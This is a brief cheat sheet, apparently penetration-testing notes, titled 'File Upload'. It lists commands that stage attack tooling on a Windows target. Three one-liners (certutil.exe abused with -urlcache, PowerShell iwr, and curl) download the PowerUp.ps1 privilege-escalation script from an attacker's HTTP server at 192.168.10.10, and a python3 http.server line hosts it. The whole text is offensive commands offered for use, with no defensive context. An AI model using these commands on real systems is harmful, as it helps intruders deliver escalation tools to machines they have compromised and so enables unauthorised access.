# File Upload

    certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1 ( only run on cmd)

    iwr -uri http://192.168.10.10/PowerUp.ps1 -Outfile PowerUp.ps1 (power shell)

    curl 192.168.10.10/PowerUp.ps1 -Outfile PowerUp.ps1 (both)

Start http server with 

    python3 -m http.server 80 or 81 etc
